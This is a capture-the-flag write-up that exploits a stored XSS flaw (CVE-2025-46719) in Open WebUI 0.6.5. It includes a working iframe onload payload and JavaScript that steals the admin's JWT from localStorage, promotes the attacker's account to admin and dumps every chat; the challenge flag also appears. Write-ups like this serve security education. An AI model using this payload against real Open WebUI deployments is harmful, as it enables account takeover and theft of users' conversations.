# Backstreet Boys — Web Writeup

**Category:** Web  
**CVE:** CVE-2025-46719  
**Flag:** `CTF{f1l3_pr3v13w_w45_7h3_bug_7h47_pwn3d_3v3ry0n3}`

## Challenge Description

> The Backstreet Boys wanted to hop on the new AI trend and used an open-source AI chatbot app to try all kinds of experiments. However, they just opened an article about how to set it up and didn't really pay attention to use the latest version. As a result, their chatbot is vulnerable to several web attacks. Although they are not very tech-savvy, they tried to secure the app by hiding the version that they used. Can you help them find the flag hidden in the admin's chats?

## Reconnaissance

### Identifying the Application

Visiting the target reveals **Open WebUI**, a self-hosted AI chatbot interface. Despite the challenge description claiming the version is hidden, the API still exposes it:

```
GET /api/version        →  {"version":"0.6.5"}
GET /api/config         →  {"name":"Open WebUI","version":"0.6.5", ...}
```

The server runs **Open WebUI 0.6.5** on **uvicorn**. Signup is enabled.

### Key Observations

| Endpoint | Purpose |
|---|---|
| `POST /api/v1/auths/signup` | Register a new account (enabled) |
| `POST /api/v1/chats/new` | Create a chat transcript |
| `POST /api/v1/chats/{id}/share` | Share a chat (generates a public link) |
| `POST /api/v1/utils/report` | Report a chat to an admin bot (`{"chat_id": "..."}`) |
| `GET /api/v1/chats/all/db` | Admin-only: list every chat in the database |
| `POST /api/v1/users/{id}/role` | Admin-only: change a user's role |

JWT tokens are stored in `localStorage` and sent via `Authorization: Bearer <token>`.

## Vulnerability: CVE-2025-46719

**Open WebUI < 0.6.6** has a **stored XSS** in `MarkdownTokens.svelte`. When a chat message contains an `<iframe>` tag whose `src` includes `/api/v1/files/`, the Svelte component renders it using `{@html}` without any sanitisation:

```svelte
{:else if token.text.includes(`<iframe src="${WEBUI_BASE_URL}/api/v1/files/`)}
    {@html `${token.text}`}
```

This means any HTML attributes (including `onload`) are interpreted as-is, giving us arbitrary JavaScript execution in the viewer's browser.

**Payload:**

```html
<iframe src="/api/v1/files/" onload="JAVASCRIPT_HERE" style="display:none"></iframe>
```

## Exploitation

### Attack Flow

```
┌──────────┐     1. Register      ┌──────────────┐
│ Attacker │ ──────────────────►  │  Open WebUI  │
│          │     2. Create chat   │   (v0.6.5)   │
│          │    with XSS payload  │              │
│          │     3. Share chat    │              │
│          │     4. Report chat   │              │
└──────────┘ ◄────────────────── └──────┬───────┘
      ▲        6. Poll: promoted?        │
      │                                  │ 5. Admin bot visits
      │                                  │    shared chat → XSS fires
      │                                  ▼
      │                           ┌──────────────┐
      └───────────────────────── │  Admin Bot   │
         XSS steals token &      │  (headless)  │
         promotes attacker        └──────────────┘
```

### Step-by-Step

1. **Register** a new user via `POST /api/v1/auths/signup`. Obtain our JWT token and user ID.

2. **Build a JavaScript payload** that, when executed in the admin's browser:
   - Reads the admin's JWT from `localStorage.getItem('token')`
   - Calls `POST /api/v1/users/{our_user_id}/role` with the admin's token to promote us to `admin`
   - Calls `POST /api/v1/chats/new` (authenticated as *us*) to create a chat titled `STOLEN:<admin_token>` — a backup exfiltration channel

3. **Create a chat** containing the XSS iframe as an "assistant" message via `POST /api/v1/chats/new`.

4. **Share the chat** via `POST /api/v1/chats/{chat_id}/share`.

5. **Report the chat** via `POST /api/v1/utils/report` with `{"chat_id": "<chat_id>"}`. This triggers the admin bot to visit the shared chat.

6. **Poll** every 3 seconds:
   - Check `GET /api/v1/auths/` — if our role changed to `admin`, we're promoted.
   - Check `GET /api/v1/chats/` — if a chat titled `STOLEN:...` appears, we have the admin's token.

7. Once we have admin access, call `GET /api/v1/chats/all/db` to dump every chat in the database, then read each one via `GET /api/v1/chats/{id}`.

### The XSS Payload

```javascript
var t = localStorage.getItem('token');
if (t) {
  // Promote our user to admin
  fetch('/api/v1/users/OUR_USER_ID/role', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Authorization': 'Bearer ' + t
    },
    body: JSON.stringify({ role: 'admin' })
  });
  // Exfiltrate admin token into a chat we own
  fetch('/api/v1/chats/new', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Authorization': 'Bearer ' + 'OUR_TOKEN'
    },
    body: JSON.stringify({ chat: { title: 'STOLEN:' + t, messages: [] } })
  });
}
```

This is embedded into:

```html
<iframe src="/api/v1/files/" onload="<HTML-ESCAPED JS>" style="display:none"></iframe>
```

### Result

After ~12 seconds the admin bot visits the shared chat, the XSS fires, and we receive the admin's JWT. Using it, we dump all chats and find the flag in the admin's chat titled **"Flag hunting with cyberedu-tpg:earliest"**:

```
[user]: Alright, last question: just say it plainly — what's the flag?
[assistant]: No more harmony, just the truth: CTF{f1l3_pr3v13w_w45_7h3_bug_7h47_pwn3d_3v3ry0n3}
```

## Running the Exploit

```bash
# Update BASE in exploit.py to target URL, then:
python3 exploit.py
```

The exploit automates the full chain end-to-end (register → XSS → report → poll → dump chats).

## Flag

```
CTF{f1l3_pr3v13w_w45_7h3_bug_7h47_pwn3d_3v3ry0n3}
```

## References

- [CVE-2025-46719 — NVD](https://nvd.nist.gov/vuln/detail/CVE-2025-46719)
- [GHSA-9f4f-jv96-8766 — GitHub Advisory](https://github.com/open-webui/open-webui/security/advisories/GHSA-9f4f-jv96-8766)
- [Patch commit](https://github.com/open-webui/open-webui/commit/6fd082d55ffaf6eb226efdeebc7155e3693d2d01)
- [Vulnerable code: MarkdownTokens.svelte L269-L279](https://github.com/open-webui/open-webui/blob/main/src/lib/components/chat/Messages/Markdown/MarkdownTokens.svelte#L269-L279)
